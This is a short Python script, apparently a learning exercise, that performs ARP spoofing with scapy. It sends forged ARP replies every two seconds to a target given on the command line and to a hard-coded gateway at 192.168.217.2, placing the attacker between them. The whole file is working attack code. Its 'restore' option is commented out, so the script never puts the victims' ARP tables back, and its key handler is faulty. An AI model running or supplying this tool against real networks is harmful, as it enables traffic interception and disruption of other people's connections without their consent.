#!usr/bin/env python3

import scapy.all as scapy
import time
import argparse
from pynput import keyboard

# Forged ARP packet
# op=2: ARP Response
# pdst: Destination IP which is the target machine
# psrc: Source IP which is the router's IP


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", dest="target")
    target_ip = parser.parse_args().target
    return target_ip


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if not answered:
        print("[-] Cannot find target")
        exit()
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, restore_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=restore_ip, hwsrc=get_mac(restore_ip))
    scapy.send(packet, count=4, verbose=False)


def on_press(key):
    if key == keyboard.Key.esc:
        return False
    k = key.char
    if k == "q":
        print("[+] Quiting...")
    if k == "r":
        print("[+] Restoring target arp configurations...")
        #restore(target_ip, restore_ip)
        print("[+] Done")
    exit()


target_ipv4 = get_args()
count = 0
print("[+] Begin spoofing target " + str(target_ipv4))
print("Type <q> to quit, <r> to restore and quit")
listener = keyboard.Listener(on_press=on_press)
listener.start()
while True:
    spoof(target_ipv4, "192.168.217.2")
    spoof("192.168.217.2", target_ipv4)
    count = count + 2
    print("\r[+] Packets sent: " + str(count), end="")
    time.sleep(2)


